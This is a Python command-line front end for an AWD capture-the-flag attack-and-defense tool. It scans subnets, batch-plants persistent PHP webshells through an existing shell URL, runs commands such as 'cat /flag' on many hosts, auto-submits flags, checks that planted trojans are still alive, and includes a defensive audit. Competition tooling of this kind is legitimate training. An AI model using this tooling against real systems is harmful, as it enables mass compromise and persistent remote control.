# -*- coding: utf-8 -*-
"""
AWD 工具 - 命令行版
=========================
不依赖 PySide6，复用 core.py / config.py，适合服务器、自动化脚本和课堂终端演示。

示例：
    python cli.py scan --my-ip 10.3.4.139 --save
    python cli.py write --target 10.3.4.70 --url http://127.0.0.1/shell.php
    python cli.py fetch --target-file ip.txt --url http://127.0.0.1/shell.php
    python cli.py submit --target-file ip.txt --url http://127.0.0.1/shell.php \
        --raw-file request.txt --param flag
    python cli.py command --target 10.3.4.70 --cmd "id"
    python cli.py health --target-file ip.txt --url http://127.0.0.1/shell.php

说明：
- 日志写 stderr，结果写 stdout，便于脚本管道；
- --json 时 stdout 只输出一个 JSON 对象；
- 状态与 GUI 共用 state.json（last_flag / submitted / flag_path / alive / written）。

author : anglekat
"""

import argparse
import json
import os
import sys
import threading
import time

import config
import core


def _log(text, level='INFO'):
    print('[%s] %-5s %s' % (time.strftime('%H:%M:%S'), level, text),
          file=sys.stderr, flush=True)


def _emit_json(data):
    print(json.dumps(data, ensure_ascii=False, indent=2))


def _add_common(parser):
    parser.add_argument('--target', action='append', default=[],
                        help='目标 ip[:port]，可重复')
    parser.add_argument('--target-file', default='',
                        help='目标文件，默认 ip.txt')
    parser.add_argument('--url', default='',
                        help='入口 shell URL / 根 URL 模板')
    parser.add_argument('--workers', type=int, default=None,
                        help='并发数，默认取设置')
    parser.add_argument('--timeout', type=float, default=None,
                        help='请求超时，默认取设置')
    parser.add_argument('--json', action='store_true', help='JSON 输出')


def _targets(args):
    lines = list(args.target or [])
    path = args.target_file
    if not lines:
        path = args.target_file or config.IP文件
    if path:
        try:
            with open(path, 'r', encoding='utf-8') as f:
                lines.extend(f.read().splitlines())
        except OSError as exc:
            _log('读取目标文件失败：%s' % exc, 'WARN')
    targets, bad = core.parse_targets_text('\n'.join(lines))
    for line in bad[:10]:
        _log('忽略无法解析的目标：%s' % line, 'WARN')
    if not targets:
        _log('没有有效目标，请用 --target 或 --target-file', 'ERROR')
    return targets


def _workers(args, default=None):
    try:
        return max(1, int(args.workers or default or config.任务并发))
    except (TypeError, ValueError):
        return max(1, int(config.任务并发))


def _timeout(args, default=None):
    try:
        return float(args.timeout or default or config.请求超时)
    except (TypeError, ValueError):
        return float(config.请求超时)


def _base(args, target):
    if args.url:
        return core.base_from_url(args.url, target)
    return core.base_default(target)


def _state():
    data = config.load_state()
    if not isinstance(data, dict):
        data = {}
    for key in ('last_flag', 'submitted', 'flag_path'):
        if not isinstance(data.get(key), dict):
            data[key] = {}
    for key in ('alive', 'written'):
        if not isinstance(data.get(key), list):
            data[key] = []
    return data


def _save_state(state):
    config.save_state(state)


# ---------------------------------------------------------------- 子命令
def cmd_scan(args):
    if not core.parse_ip_field(args.my_ip):
        _log('IP 不合法：%s' % args.my_ip, 'ERROR')
        return 2
    port = args.port or config.目标端口
    alive = core.scan_hosts(
        core.parse_ip_field(args.my_ip), args.my_ip,
        timeout=_timeout(args, config.扫描超时),
        workers=_workers(args, config.并发数), port=port)
    state = _state()
    state['alive'] = [core.format_target(ip, port) for ip in alive]
    _save_state(state)
    if args.save:
        path = args.output or config.IP文件
        try:
            with open(path, 'w', encoding='utf-8') as f:
                f.write('\n'.join(core.format_target(ip, port) for ip in alive))
            _log('已写入 %s（%d 台）' % (path, len(alive)), 'INFO')
        except OSError as exc:
            _log('写入失败：%s' % exc, 'ERROR')
    if args.json:
        _emit_json({'alive': alive})
    else:
        for ip in alive:
            print(ip)
    _log('存活 %d 台' % len(alive), 'INFO')
    return 0


def cmd_write(args):
    targets = _targets(args)
    if not targets:
        return 2
    if not args.url:
        _log('write 需要 --url（入口 shell 地址）', 'ERROR')
        return 2
    options = {
        'url': args.url,
        'url_type': '代码执行' if args.mode == 'php' else '命令执行',
        'pass_type': 'GET传参密码' if args.param_type == 'get' else 'POST传参密码',
        'pass_word': args.param or 'cmd',
        'headers': core.parse_headers('\n'.join(args.header or [])),
        'code': args.code or config.busima_default(),
    }
    results = []

    def one(target):
        # run_batch 的 row 已经带 target，这里只返回 (ok, detail)
        return core.write_busima_ex(core.get_session(), target, options)

    def on_row(row):
        target, result, error = row
        key = core.target_key(target)
        if error:
            ok, detail = False, error
        elif isinstance(result, tuple):
            ok, detail = result
        else:
            ok, detail = bool(result), ''
        results.append((key, ok, detail))
        _log('%s %s %s' % (key, 'OK' if ok else 'FAIL', detail),
             'INFO' if ok else 'WARN')

    core.run_batch(targets, one, workers=_workers(args), on_done=on_row)
    results.sort(key=lambda r: core.ip_sort_key(r[0]))
    state = _state()
    written = {str(x) for x in state.get('written', []) if x}
    written.update(key for key, ok, _ in results if ok)
    state['written'] = sorted(written)
    _save_state(state)
    if args.json:
        _emit_json({'results': [{'target': k, 'ok': o, 'detail': d}
                                for k, o, d in results]})
    else:
        for key, ok, detail in results:
            print('%s\t%s\t%s' % (key, 'OK' if ok else 'FAIL', detail))
    return 0 if any(ok for _, ok, _ in results) else 1


def cmd_fetch(args):
    targets = _targets(args)
    if not targets:
        return 2
    state = _state()
    cmd = args.cmd or 'cat /flag'

    def one(target):
        key = core.target_key(target)
        known = state['flag_path'].get(key)
        flag, detail, path = core.fetch_flag_detail(
            core.get_session(), _base(args, target), cmd,
            timeout=_timeout(args), known_paths=[known] if known else None)
        return key, flag, detail, path

    results = core.run_batch(targets, one, workers=_workers(args))
    data = []
    for target, result, error in results:
        key = core.target_key(target)
        if error:
            flag, detail, path = '', error, ''
        else:
            key, flag, detail, path = result
        if flag:
            state['last_flag'][key] = flag
        if path:
            state['flag_path'][key] = path
        data.append({'target': key, 'flag': flag,
                     'detail': detail, 'path': path})
        _log('%s %s %s' % (key, flag or '-', detail),
             'INFO' if flag else 'WARN')
    _save_state(state)
    data.sort(key=lambda r: core.ip_sort_key(r['target']))
    if args.json:
        _emit_json({'results': data})
    else:
        for row in data:
            print('%s\t%s' % (row['target'], row['flag'] or '-'))
    return 0 if any(row['flag'] for row in data) else 1


def cmd_submit(args):
    raw = args.raw or ''
    if args.raw_file:
        try:
            with open(args.raw_file, 'r', encoding='utf-8') as f:
                raw = f.read()
        except OSError as exc:
            _log('读取报文失败：%s' % exc, 'ERROR')
            return 2
    if not raw.strip():
        _log('submit 需要 --raw 或 --raw-file', 'ERROR')
        return 2
    try:
        submission = core.prepare_submission(raw)
    except ValueError as exc:
        _log('报文解析失败：%s' % exc, 'ERROR')
        return 2
    param = args.param or 'flag'
    if getattr(args, 'dry_run', False):
        info = core.describe_submission(submission, 'flag{PREVIEW}', param)
        if args.json:
            _emit_json(info)
        else:
            print('METHOD: %s' % info['method'])
            print('URL: %s' % info['url'])
            print('HEADERS:')
            for key, value in info['headers'].items():
                print('%s: %s' % (key, value))
            print('BODY:')
            print(info['body'])
        return 0
    targets = _targets(args)
    if not targets:
        return 2
    cmd = args.cmd or 'cat /flag'
    state = _state()
    only_changed = bool(args.only_changed)
    dedupe = bool(getattr(args, 'dedupe', False) or config.全局去重)
    interval = (args.interval if getattr(args, 'interval', None) is not None
                else config.提交间隔)
    dedup_lock = threading.Lock()
    dedup_flags = {str(v) for v in state['submitted'].values() if v}
    limiter = core.RateLimiter(interval)
    results = []

    def one(target):
        key = core.target_key(target)
        known = state['flag_path'].get(key)
        flag, detail, path = core.fetch_flag_detail(
            core.get_session(), _base(args, target), cmd,
            timeout=_timeout(args), known_paths=[known] if known else None)
        if not flag:
            return key, '', '未取到 flag：%s' % (detail or '')[:120], path
        if dedupe and flag in dedup_flags and state['submitted'].get(key) != flag:
            return key, flag, '跳过（重复 flag）', path
        if (only_changed and state['last_flag'].get(key) == flag
                and state['submitted'].get(key) == flag):
            return key, flag, '跳过（未变化）', path
        try:
            limiter.wait()
            resp = core.submit_flag_retry(
                core.get_session(), submission, flag, param,
                timeout=_timeout(args))
            verdict, why = core.judge_submission(resp)
            if verdict == 'success':
                if dedupe:
                    with dedup_lock:
                        dedup_flags.add(flag)
                mark = '成功'
            elif verdict == 'fail':
                mark = '失败：%s' % why
            else:
                mark = '未知：%s' % why
        except Exception as exc:  # noqa: BLE001
            mark = '提交异常：%s' % core.classify_error(exc)
        return key, flag, mark, path

    def on_row(row):
        target, result, error = row
        key = core.target_key(target)
        if error:
            data = (key, '', '任务异常：%s' % error, '')
        else:
            data = result
        results.append(data)
        _log('%s %s' % (key, data[2]),
             'INFO' if data[2] == '成功' else 'WARN')

    core.run_batch(targets, one, workers=_workers(args, config.提交并发),
                   on_done=on_row)
    ok = fail = 0
    for key, flag, mark, path in results:
        if flag:
            state['last_flag'][key] = flag
        if path:
            state['flag_path'][key] = path
        if mark == '成功':
            ok += 1
            state['submitted'][key] = flag
        elif mark.startswith('跳过'):
            pass
        else:
            fail += 1
    _save_state(state)
    results.sort(key=lambda r: core.ip_sort_key(r[0]))
    if args.json:
        _emit_json({'ok': ok, 'fail': fail,
                    'results': [{'target': k, 'flag': f, 'result': m,
                                 'path': p} for k, f, m, p in results]})
    else:
        for key, flag, mark, path in results:
            print('%s\t%s\t%s\t%s' % (key, flag or '-', mark, path or '-'))
    _log('提交完成：成功 %d，失败 %d' % (ok, fail), 'INFO')
    return 0 if ok else 1


def cmd_command(args):
    targets = _targets(args)
    if not targets:
        return 2
    if args.php and args.cmd:
        _log('--php 与 --cmd 只能二选一', 'ERROR')
        return 2
    php = args.php or ''
    cmd = args.cmd or 'id'

    def one(target):
        key = core.target_key(target)
        base = _base(args, target)
        if php:
            text, error = core.exec_php(
                core.get_session(), base, php, _timeout(args))
            if text and core.MARK in text:
                text = core.between_markers(text)
        else:
            text, error = core.exec_shell(
                core.get_session(), base, cmd, _timeout(args))
        return key, text or '', error

    results = core.run_batch(targets, one, workers=_workers(args))
    data = []
    for target, result, error in results:
        key = core.target_key(target)
        if error:
            text = ''
            detail = error
        else:
            key, text, detail = result
        data.append({'target': key, 'output': text, 'error': detail or ''})
        _log('%s %s' % (key, detail or 'OK'),
             'WARN' if detail else 'INFO')
    data.sort(key=lambda r: core.ip_sort_key(r['target']))
    if args.json:
        _emit_json({'results': data})
    else:
        for row in data:
            output = (row['output'] or '').rstrip('\n')
            print('%s\t%s' % (row['target'], output.replace('\n', ' | ')))
    return 0


def cmd_health(args):
    targets = _targets(args)
    if not targets:
        return 2

    def one(target):
        key = core.target_key(target)
        alive, detail = core.check_shell(
            core.get_session(), _base(args, target), _timeout(args))
        return key, alive, detail

    results = core.run_batch(targets, one, workers=_workers(args))
    data = []
    alive_keys = []
    for target, result, error in results:
        key = core.target_key(target)
        if error:
            alive, detail = False, error
        else:
            key, alive, detail = result
        if alive:
            alive_keys.append(key)
        data.append({'target': key, 'alive': bool(alive), 'detail': detail})
        _log('%s %s' % (key, 'ALIVE' if alive else 'DEAD'),
             'INFO' if alive else 'WARN')
    data.sort(key=lambda r: core.ip_sort_key(r['target']))
    state = _state()
    state['alive'] = sorted(alive_keys)
    _save_state(state)
    if args.json:
        _emit_json({'alive': sorted(alive_keys), 'results': data})
    else:
        for row in data:
            print('%s\t%s\t%s' % (row['target'],
                                  'ALIVE' if row['alive'] else 'DEAD',
                                  row['detail']))
    return 0


def cmd_probe(args):
    targets = _targets(args)
    if not targets:
        return 2

    def one(target):
        return core.probe_target(target, _timeout(args, config.扫描超时))

    results = core.run_batch(targets, one,
                             workers=_workers(args, config.并发数))
    data = []
    alive_keys = []
    for target, result, error in results:
        key = core.target_key(target)
        if error:
            alive, detail = False, error
        else:
            alive, detail = result
        if alive:
            alive_keys.append(key)
        data.append({'target': key, 'alive': bool(alive), 'detail': detail})
        _log('%s %s' % (key, 'ALIVE' if alive else 'DEAD'),
             'INFO' if alive else 'WARN')
    data.sort(key=lambda r: core.ip_sort_key(r['target']))
    state = _state()
    state['alive'] = sorted(alive_keys)
    _save_state(state)
    if args.json:
        _emit_json({'alive': sorted(alive_keys), 'results': data})
    else:
        for row in data:
            print('%s\t%s\t%s' % (row['target'],
                                  'ALIVE' if row['alive'] else 'DEAD',
                                  row['detail']))
    return 0 if alive_keys else 1


def cmd_check(args):
    targets = _targets(args)
    if not targets:
        return 2

    def one(target):
        key = core.target_key(target)
        return key, core.defense_check(
            core.get_session(), _base(args, target),
            args.timeout if args.timeout else None)

    results = core.run_batch(targets, one, workers=_workers(args))
    data = []
    reports = []
    risk = 0
    for target, result, error in results:
        key = core.target_key(target)
        if error:
            result = {'error': error,
                      'findings': [('错误', '体检失败', error)],
                      'sections': {}, 'raw': ''}
        elif isinstance(result, tuple) and len(result) == 2:
            key, result = result
        findings = result.get('findings', []) if isinstance(result, dict) else []
        levels = [str(item[0]) for item in findings]
        if '严重' in levels:
            status = '严重'
            risk = 1
        elif '注意' in levels:
            status = '注意'
            risk = 1
        elif '错误' in levels:
            status = '错误'
            risk = 1
        elif '提示' in levels:
            status = '提示'
        else:
            status = '正常'
        data.append({'target': key, 'status': status,
                     'findings': [{'level': str(a), 'title': str(b),
                                   'detail': str(c)}
                                  for a, b, c in findings]})
        reports.append(core.defense_report(result, key))
        _log('%s %s' % (key, status),
             'WARN' if status in ('严重', '注意', '错误') else 'INFO')
    data.sort(key=lambda r: core.ip_sort_key(r['target']))
    if args.json:
        _emit_json({'results': data})
    else:
        print('\n\n'.join(reports))
    return risk


# ---------------------------------------------------------------- 入口
def build_parser():
    parser = argparse.ArgumentParser(
        prog='cli.py', description='AWD 批量工具 - 命令行版（不依赖 PySide6）')
    parser.add_argument('--version', action='version', version='AWD CLI v3.1')
    sub = parser.add_subparsers(dest='command', required=True)

    p = sub.add_parser('scan', help='扫描网段存活')
    p.add_argument('--my-ip', required=True,
                   help='我的 IP / 网段前缀，如 10.3.4.139 / 10.3. / 10.1.x.1')
    p.add_argument('--port', default=None, help='web 端口，默认取设置')
    p.add_argument('--timeout', type=float, default=None)
    p.add_argument('--workers', type=int, default=None)
    p.add_argument('--save', action='store_true', help='写入 ip.txt')
    p.add_argument('--output', default='', help='--save 的输出文件')
    p.add_argument('--json', action='store_true')
    p.set_defaults(func=cmd_scan)

    p = sub.add_parser('write', help='批量写入不死马')
    _add_common(p)
    p.add_argument('--mode', choices=('php', 'cmd'), default='php',
                   help='php=代码执行（默认），cmd=命令执行')
    p.add_argument('--param-type', choices=('get', 'post'), default='post',
                   help='入口传参方式')
    p.add_argument('--param', default='cmd', help='入口参数名')
    p.add_argument('--header', action='append', default=[],
                   help='自定义请求头，可重复：--header "Cookie: a=1"')
    p.add_argument('--code', default='', help='不死马代码，默认用配置模板')
    p.set_defaults(func=cmd_write)

    p = sub.add_parser('fetch', help='批量取 flag')
    _add_common(p)
    p.add_argument('--cmd', default='cat /flag', help='取 flag 命令')
    p.set_defaults(func=cmd_fetch)

    p = sub.add_parser('submit', help='批量取 flag 并提交')
    _add_common(p)
    p.add_argument('--raw', default='', help='提交报文（单行转义较麻烦，建议 --raw-file）')
    p.add_argument('--raw-file', default='', help='提交报文文件')
    p.add_argument('--param', default='flag', help='提交参数名')
    p.add_argument('--cmd', default='cat /flag', help='取 flag 命令')
    p.add_argument('--only-changed', action='store_true',
                   help='只提交变化的 flag')
    p.add_argument('--dedupe', action='store_true',
                   help='同一个 flag 只提交一次（也可在设置里默认开启）')
    p.add_argument('--interval', type=float, default=None,
                   help='两次提交之间的最小间隔（秒），默认取设置')
    p.add_argument('--dry-run', action='store_true',
                   help='只预览解析后的请求，不发送')
    p.set_defaults(func=cmd_submit)

    p = sub.add_parser('command', help='批量执行命令或 PHP 代码')
    _add_common(p)
    p.add_argument('--cmd', default='', help='Shell 命令（默认 id）')
    p.add_argument('--php', default='', help='PHP 代码（不要带 <?php ?>）')
    p.set_defaults(func=cmd_command)

    p = sub.add_parser('health', help='健康巡检落地木马')
    _add_common(p)
    p.set_defaults(func=cmd_health)

    p = sub.add_parser('probe', help='按列表 TCP 测试目标存活')
    _add_common(p)
    p.set_defaults(func=cmd_probe)

    p = sub.add_parser('check', help='防守体检（webshell/flag 权限/SUID 等）')
    _add_common(p)
    p.set_defaults(func=cmd_check)
    return parser


def main(argv=None):
    args = build_parser().parse_args(argv)
    config.ensure_dirs()
    config.load_settings()
    try:
        return int(args.func(args))
    except KeyboardInterrupt:
        _log('已中断', 'WARN')
        return 130
    except Exception as exc:  # noqa: BLE001
        if os.environ.get('AWD_DEBUG'):
            raise
        _log('运行失败：%s' % exc, 'ERROR')
        return 1


if __name__ == '__main__':
    sys.exit(main())
